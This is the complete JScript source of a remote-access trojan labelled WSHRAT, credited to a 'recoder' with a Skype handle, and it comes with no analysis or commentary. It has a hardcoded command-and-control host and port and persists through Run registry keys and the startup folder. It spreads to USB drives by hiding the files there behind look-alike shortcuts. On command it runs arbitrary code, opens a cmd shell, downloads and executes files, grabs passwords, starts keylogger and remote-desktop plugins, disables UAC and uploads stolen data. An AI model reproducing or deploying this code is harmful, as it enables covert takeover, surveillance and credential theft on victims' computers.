//<[ recoder : kognito (c) skype : live:unknown.sales64 ]>

//=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=

var host = "chongmei33.publicvm.com";
var port = 7045;
var installdir = "%temp%";
var lnkfile = true;
var lnkfolder = true;

//=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=

var shellobj = WScript.createObject("wscript.shell");
var filesystemobj = WScript.createObject("scripting.filesystemobject");
var httpobj = WScript.createObject("msxml2.xmlhttp");


//=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=

var installname = WScript.scriptName;
var startup = shellobj.specialFolders("startup") + "\\";
installdir = shellobj.ExpandEnvironmentStrings(installdir) + "\\";
if (!filesystemobj.folderExists(installdir)) {
    installdir = shellobj.ExpandEnvironmentStrings("%temp%") + "\\";
}
var spliter = "|";
var sleep = 5000;
var response, cmd, param, oneonce;

var inf = "";
var usbspreading = "";
var startdate = "";

//=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=

instance();

while (true) {
    try {
        install();
        response = "";
        response = post("is-ready", "");
        cmd = response.split(spliter);
        switch (cmd[0]) {
            case "disconnect":
                WScript.quit();
                break;
            case "reboot":
                shellobj.run("%comspec% /c shutdown /r /t 0 /f", 0, true);
                break;
            case "shutdown":
                shellobj.run("%comspec% /c shutdown /s /t 0 /f", 0, true);
                break;
            case "excecute":
                param = cmd[1];
                eval(param);
                break;
            case "get-pass":
                passgrabber(cmd[1], "cmdc.exe", cmd[2]);
                break;
            case "uninstall":
                uninstall();
                break;
            case "up-n-exec":
                download(cmd[1], cmd[2]);
                break;
            case "bring-log":
                upload(installdir + "wshlogs\\" + cmd[1], "take-log");
                break;
            case "down-n-exec":
                sitedownloader(cmd[1], cmd[2]);
                break;
            case "filemanager":
                servicestarter(cmd[1], "fm-plugin.exe", information());
                break;
            case "rdp":
                servicestarter(cmd[1], "rd-plugin.exe", information());
                break;
            case "keylogger":
                keyloggerstarter(cmd[1], "kl-plugin.exe", information(), 0);
                break;
            case "offline-keylogger":
                keyloggerstarter(cmd[1], "kl-plugin.exe", information(), 1);
                break;
            case "browse-logs":
                post("is-logs", enumfaf(installdir + "wshlogs"));
                break;
            case "cmd-shell":
                param = cmd[1];
                post("is-cmd-shell", cmdshell(param));
                break;
            case "get-processes":
                post("is-processes", enumprocess());
                break;
            case "disable-uac":
                if (WScript.Arguments.Named.Exists("elevated") == true) {
                    var oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\default:StdRegProv");
                    oReg.SetDwordValue(0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", 0);
                    oReg.SetDwordValue(0x80000002, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", 0);
                    oReg = null;
                    updatestatus("UAC+Disabled+(Reboot+Required)");
                }
                break;
            case "elevate":
                if (WScript.Arguments.Named.Exists("elevated") == false) {
                    try {
                        oneonce.close();
                        oneonce = null;
                        WScript.CreateObject("Shell.Application").ShellExecute("wscript.exe", " //B \"" + WScript.ScriptFullName + "\" /elevated", "", "runas", 1);
                        updatestatus("Client+Elevated");
                    } catch (nn) {
                    }
                    WScript.quit();
                } else {
                    updatestatus("Client+Elevated");
                }
                break;
            case "if-elevate":
                if (WScript.Arguments.Named.Exists("elevated") == false) {
                    updatestatus("Client+Not+Elevated");
                } else {
                    updatestatus("Client+Elevated");
                }
                break;
            case "kill-process":
                exitprocess(cmd[1]);
                break;
            case "sleep":
                param = cmd[1];
                sleep = eval(param);
                break;
        }

    } catch (er) {}
    WScript.sleep(sleep);
}

function install() {
    var lnkobj;
    var filename;
    var foldername;
    var fileicon;
    var foldericon;

    upstart();

    for (var dri = new Enumerator(filesystemobj.drives); !dri.atEnd(); dri.moveNext()) {
        var drive = dri.item();
        if (drive.isready == true) {
            if (drive.freespace > 0) {
                if (drive.drivetype == 1) {
                    try {
                        filesystemobj.copyFile(WScript.scriptFullName, drive.path + "\\" + installname, true);
                        if (filesystemobj.fileExists(drive.path + "\\" + installname)) {
                            filesystemobj.getFile(drive.path + "\\" + installname).attributes = 2 + 4;
                        }
                    } catch (eiju) {}
                    for (var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").files); !fi.atEnd(); fi.moveNext()) {
                        try {
                            var file = fi.item();
                            if (lnkfile == false) {
                                break;
                            }
                            if (file.name.indexOf(".")) {
                                if ((file.name.split(".")[file.name.split(".").length - 1]).toLowerCase() != "lnk") {
                                    file.attributes = 2 + 4;
                                    if (file.name.toUpperCase() != installname.toUpperCase()) {
                                        filename = file.name.split(".");
                                        lnkobj = shellobj.createShortcut(drive.path + "\\" + filename[0] + ".lnk");
                                        lnkobj.windowStyle = 7;
                                        lnkobj.targetPath = "cmd.exe";
                                        lnkobj.workingDirectory = "";
                                        lnkobj.arguments = "/c start " + installname.replace(new RegExp(" ", "g"), "\" \"") + "&start " + file.name.replace(new RegExp(" ", "g"), "\" \"") + "&exit";
                                        try {
                                            fileicon = shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\classes\\" + shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\classes\\." + file.name.split(".")[file.name.split(".").length - 1] + "\\") + "\\defaulticon\\");
                                        } catch (eeee) {}
                                        if (fileicon.indexOf(",") == 0) {
                                            lnkobj.iconLocation = file.path;
                                        } else {
                                            lnkobj.iconLocation = fileicon;
                                        }
                                        lnkobj.save();
                                    }
                                }
                            }
                        } catch (err) {}
                    }
                    for (var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").subFolders); !fi.atEnd(); fi.moveNext()) {
                        try {
                            var folder = fi.item();
                            if (lnkfolder == false) {
                                break;
                            }
                            folder.attributes = 2 + 4;
                            foldername = folder.name;
                            lnkobj = shellobj.createShortcut(drive.path + "\\" + foldername + ".lnk");
                            lnkobj.windowStyle = 7;
                            lnkobj.targetPath = "cmd.exe";
                            lnkobj.workingDirectory = "";
                            lnkobj.arguments = "/c start " + installname.replace(new RegExp(" ", "g"), "\" \"") + "&start explorer " + folder.name.replace(new RegExp(" ", "g"), "\" \"") + "&exit";
                            foldericon = shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\classes\\folder\\defaulticon\\");
                            if (foldericon.indexOf(",") == 0) {
                                lnkobj.iconLocation = folder.path;
                            } else {
                                lnkobj.iconLocation = foldericon;
                            }
                            lnkobj.save();
                        } catch (err) {}
                    }
                }
            }
        }
    }
}

function uninstall() {
    try {
        var filename;
        var foldername;
        try {
            shellobj.RegDelete("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0]);
            shellobj.RegDelete("HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0]);
        } catch (ei) {}
        try {
            filesystemobj.deleteFile(startup + installname, true);
            filesystemobj.deleteFile(wscript.scriptfullname, true);
        } catch (eej) {}
        for (var dri = new Enumerator(filesystemobj.drives); !dri.atEnd(); dri.moveNext()) {
            var drive = dri.item();
            if (drive.isready == true) {
                if (drive.freespace > 0) {
                    if (drive.drivetype == 1) {
                        for (var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").files); !fi.atEnd(); fi.moveNext()) {
                            var file = fi.item();
                            try {
                                if (file.name.indexOf(".")) {
                                    if ((file.name.split(".")[file.name.split(".").length - 1]).toLowerCase() != "lnk") {
                                        file.attributes = 0;
                                        if (file.name.toUpperCase() != installname.toUpperCase()) {
                                            filename = file.name.split(".");
                                            filesystemobj.deleteFile(drive.path + "\\" + filename[0] + ".lnk");
                                        } else {
                                            filesystemobj.deleteFile(drive.path + "\\" + file.name);
                                        }
                                    } else {
                                        filesystemobj.deleteFile(file.path);
                                    }
                                }
                            } catch (ex) {}
                        }
                        for (var fi = new Enumerator(filesystemobj.getfolder(drive.path + "\\").subFolders); !fi.atEnd(); fi.moveNext()) {
                            var folder = fi.item();
                            folder.attributes = 0;
                        }
                    }
                }
            }
        }
    } catch (err) {}
    WScript.quit();
}

function post(cmd, param) {
    try {
        httpobj.open("post", "http://" + host + ":" + port + "/" + cmd, false);
        httpobj.setRequestHeader("user-agent:", information());
        httpobj.send(param);
        return httpobj.responseText;
    } catch (err) {
        return "";
    }
}

function information() {
    try {
        if (inf == "") {
            inf = hwid() + spliter;
            inf = inf + shellobj.ExpandEnvironmentStrings("%computername%") + spliter;
            inf = inf + shellobj.ExpandEnvironmentStrings("%username%") + spliter;

            var root = GetObject("winmgmts:{impersonationlevel=impersonate}!\\\\.\\root\\cimv2");
            var os = root.ExecQuery("select * from win32_operatingsystem");

            for (var fi = new Enumerator(os); !fi.atEnd(); fi.moveNext()) {
                var osinfo = fi.item();
                inf = inf + osinfo.caption + spliter;
                break;
            }
            inf = inf + "plus" + spliter;
            inf = inf + security() + spliter;
            inf = inf + usbspreading;
            inf = "WSHRAT" + spliter + inf + spliter + "JavaScript";
            return inf;
        } else {
            return inf;
        }
    } catch (err) {
        return "";
    }
}


function upstart() {
    try {
        try {
            shellobj.RegWrite("HKEY_CURRENT_USER\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0], "wscript.exe //B \"" + installdir + installname + "\"", "REG_SZ");
            shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\run\\" + installname.split(".")[0], "wscript.exe //B \"" + installdir + installname + "\"", "REG_SZ");
        } catch (ei) {}
        filesystemobj.copyFile(WScript.scriptFullName, installdir + installname, true);
        filesystemobj.copyFile(WScript.scriptFullName, startup + installname, true);
    } catch (err) {}
}


function hwid() {
    try {
        var root = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        var disks = root.ExecQuery("select * from win32_logicaldisk");
        for (var fi = new Enumerator(disks); !fi.atEnd(); fi.moveNext()) {
            var disk = fi.item();
            if (disk.volumeSerialNumber != "") {
                return disk.volumeSerialNumber;
                break;
            }
        }
    } catch (err) {
        return "";
    }
}


function security() {
    try {
        var objwmiservice = GetObject("winmgmts:{impersonationlevel=impersonate}!\\\\.\\root\\cimv2");
        var colitems = objwmiservice.ExecQuery("select * from win32_operatingsystem", null, 48);

        var versionstr, osversion;
        for (var fi = new Enumerator(colitems); !fi.atEnd(); fi.moveNext()) {
            var objitem = fi.item();
            versionstr = objitem.version.toString().split(".");
        }

        //versionstr = colitems.version.split(".");
        osversion = versionstr[0] + ".";
        for (var x = 1; x < versionstr.length; x++) {
            osversion = osversion + versionstr[0];
        }

        osversion = eval(osversion);
        var sc;
        if (osversion > 6) {
            sc = "securitycenter2";
        } else {
            sc = "securitycenter";
        }

        var objsecuritycenter = GetObject("winmgmts:\\\\localhost\\root\\" + sc);
        var colantivirus = objsecuritycenter.ExecQuery("select * from antivirusproduct", "wql", 0);
        var secu = "";
        for (var fi = new Enumerator(colantivirus); !fi.atEnd(); fi.moveNext()) {
            var objantivirus = fi.item();
            secu = secu + objantivirus.displayName + " .";
        }
        if (secu == "") {
            secu = "nan-av";
        }
        return secu;
    } catch (err) {}
}

function getDate() {
    var s = "";
    var d = new Date();
    s += d.getDate() + "/";
    s += (d.getMonth() + 1) + "/";
    s += d.getYear();
    return s;
}

function instance() {
    try {
        try {
            usbspreading = shellobj.RegRead("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0] + "\\");
        } catch (eee) {}
        if (usbspreading == "") {
            if (WScript.scriptFullName.substr(1).toLowerCase() == ":\\" + installname.toLowerCase()) {
                usbspreading = "true - " + getDate();
                try {
                    shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0] + "\\", usbspreading, "REG_SZ");
                } catch (eeeee) {}
            } else {
                usbspreading = "false - " + getDate();
                try {
                    shellobj.RegWrite("HKEY_LOCAL_MACHINE\\software\\" + installname.split(".")[0] + "\\", usbspreading, "REG_SZ");
                } catch (eeeee) {}
            }
        }

        upstart();

        var scriptfullnameshort = filesystemobj.getFile(WScript.scriptFullName);
        var installfullnameshort = filesystemobj.getFile(installdir + installname);
        if (scriptfullnameshort.shortPath.toLowerCase() != installfullnameshort.shortPath.toLowerCase()) {
            shellobj.run("wscript.exe //B \"" + installdir + installname + "\"");
            WScript.quit();
        }
        var oneonce = filesystemobj.openTextFile(installdir + installname, 8, false);

    } catch (err) {
        WScript.quit();
    }
}

function passgrabber(fileurl, filename, retcmd) {
    shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
    try {
        filesystemobj.deleteFile(installdir + filename + "data");
    } catch (ey) {}
    var config_file = installdir + filename.substr(0, filename.lastIndexOf(".")) + ".cfg";
    var cfg = "[General]\nShowGridLines=0\nSaveFilterIndex=0\nShowInfoTip=1\nUseProfileFolder=0\nProfileFolder=\nMarkOddEvenRows=0\nWinPos=2C 00 00 00 00 00 00 00 01 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 00 80 02 00 00 E0 01 00 00\nColumns=FA 00 00 00 FA 00 01 00 6E 00 02 00 6E 00 03 00 78 00 04 00 78 00 05 00 78 00 06 00 64 00 07 00 FA 00 08 00\nSort=0";
    //write config
    var writer = filesystemobj.openTextFile(config_file, 2, true);
    writer.writeLine(cfg);
    writer.close();
    writer = null;

    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
    objhttpdownload.send();

    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if (objfsodownload.fileExists(strsaveto)) {
        objfsodownload.deleteFile(strsaveto);
    }

    if (objhttpdownload.status == 200) {
        var objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1;
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();
        objstreamdownload = null;
    }
    if (objfsodownload.fileExists(strsaveto)) {
        var runner = WScript.CreateObject("Shell.Application");
        var saver = objfsodownload.getFile(strsaveto).shortPath
        runner.shellExecute(saver, " /stext " + saver + "data");
        WScript.sleep(2000);
        deletefaf(strsaveto);
        upload(saver + "data", retcmd);
    }
}

function keyloggerstarter(fileurl, filename, filearg, is_offline) {
    shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
    objhttpdownload.send();

    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if (objfsodownload.fileExists(strsaveto)) {
        objfsodownload.deleteFile(strsaveto);
    }

    if (objhttpdownload.status == 200) {
        var objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1;
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();

        objstreamdownload = null;
    }
    if (objfsodownload.fileExists(strsaveto)) {
        shellobj.run("\"" + strsaveto + "\" " + host + " " + port + " \"" + filearg + "\" " + is_offline);
    }
}

function servicestarter(fileurl, filename, filearg) {
    shellobj.run("%comspec% /c taskkill /F /IM " + filename, 0, true);
    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control:", "max-age=0");
    objhttpdownload.send();

    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if (objfsodownload.fileExists(strsaveto)) {
        objfsodownload.deleteFile(strsaveto);
    }

    if (objhttpdownload.status == 200) {
        var objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1;
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();

        objstreamdownload = null;
    }
    if (objfsodownload.fileExists(strsaveto)) {
        shellobj.run("\"" + strsaveto + "\" " + host + " " + port + " \"" + filearg + "\"");
    }
}

function sitedownloader(fileurl, filename) {

    var strlink = fileurl;
    var strsaveto = installdir + filename;
    var objhttpdownload = WScript.CreateObject("msxml2.serverxmlhttp");
    objhttpdownload.open("get", strlink, false);
    objhttpdownload.setRequestHeader("cache-control", "max-age=0");
    objhttpdownload.send();

    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if (objfsodownload.fileExists(strsaveto)) {
        objfsodownload.deleteFile(strsaveto);
    }

    if (objhttpdownload.status == 200) {
        var objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1;
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();

        objstreamdownload = null;
    }
    if (objfsodownload.fileExists(strsaveto)) {
        shellobj.run(objfsodownload.getFile(strsaveto).shortPath);
        updatestatus("Executed+File");
    }
}

function download(fileurl, filedir) {
    if (filedir == "") {
        filedir = installdir;
    }

    strsaveto = filedir + fileurl.substr(fileurl.lastIndexOf("\\") + 1);
    var objhttpdownload = WScript.CreateObject("msxml2.xmlhttp");
    objhttpdownload.open("post", "http://" + host + ":" + port + "/" + "send-to-me" + spliter + fileurl, false);
    objhttpdownload.setRequestHeader("user-agent:", information());
    objhttpdownload.send("");

    var objfsodownload = WScript.CreateObject("scripting.filesystemobject");
    if (objfsodownload.fileExists(strsaveto)) {
        objfsodownload.deleteFile(strsaveto);
    }

    if (objhttpdownload.status == 200) {
        var objstreamdownload = WScript.CreateObject("adodb.stream");
        objstreamdownload.Type = 1;
        objstreamdownload.Open();
        objstreamdownload.Write(objhttpdownload.responseBody);
        objstreamdownload.SaveToFile(strsaveto);
        objstreamdownload.close();

        objstreamdownload = null;
    }
    if (objfsodownload.fileExists(strsaveto)) {
        shellobj.run(objfsodownload.getFile(strsaveto).shortPath);
        updatestatus("Executed+File");
    }
}

function updatestatus(status_msg) {
    var objsoc = WScript.CreateObject("msxml2.xmlhttp");
    objsoc.open("post", "http://" + host + ":" + port + "/" + "update-status" + spliter + status_msg, false);
    objsoc.setRequestHeader("user-agent:", information());
    objsoc.send("");
}

function upload(fileurl, retcmd) {
    var httpobj, objstreamuploade, buffer;
    var objstreamuploade = WScript.CreateObject("adodb.stream");
    objstreamuploade.Type = 1;
    objstreamuploade.Open();
    objstreamuploade.loadFromFile(fileurl);
    buffer = objstreamuploade.Read();
    objstreamuploade.close();

    objstreamdownload = null;
    var httpobj = WScript.CreateObject("msxml2.xmlhttp");
    httpobj.open("post", "http://" + host + ":" + port + "/" + retcmd, false);
    httpobj.setRequestHeader("user-agent:", information());
    httpobj.send(buffer);
}

function deletefaf(url) {
    try {
        filesystemobj.deleteFile(url);
        filesystemobj.deleteFolder(url);
    } catch (err) {}
}

function cmdshell(cmd) {
    var httpobj, oexec, readallfromany;
    var strsaveto = installdir + "out.txt";
    shellobj.run("%comspec% /c " + cmd + " > \"" + strsaveto + "\"", 0, true);
    readallfromany = filesystemobj.openTextFile(strsaveto).readAll();
    try {
        filesystemobj.deleteFile(strsaveto);
    } catch (ee) {}
    return readallfromany;
}

function enumprocess() {
    var ep = "";
    try {
        var objwmiservice = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var colitems = objwmiservice.ExecQuery("select * from win32_process", null, 48);

        for (var fi = new Enumerator(colitems); !fi.atEnd(); fi.moveNext()) {
            var objitem = fi.item();
            ep = ep + objitem.name + "^";
            ep = ep + objitem.processId + "^";
            ep = ep + objitem.executablePath + spliter;
        }
    } catch (er) {}
    return ep;
}

function exitprocess(pid) {
    try {
        shellobj.run("taskkill /F /T /PID " + pid, 0, true);
    } catch (err) {}
}

function getParentDirectory(path) {
    var fo = filesystemobj.getFile(path);
    return filesystemobj.getParentFolderName(fo);
}

function enumfaf(enumdir) {
    var re = "";
    try {
        for (var fi = new Enumerator(filesystemobj.getFolder(enumdir).subfolders); !fi.atEnd(); fi.moveNext()) {
            var folder = fi.item();
            re = re + folder.name + "^^d^" + folder.attributes + spliter;
        }
        for (var fi = new Enumerator(filesystemobj.getFolder(enumdir).files); !fi.atEnd(); fi.moveNext()) {
            var file = fi.item();
            re = re + file.name + "^" + file.size + "^" + file.attributes + spliter;
        }
    } catch (err) {}
    return re;
}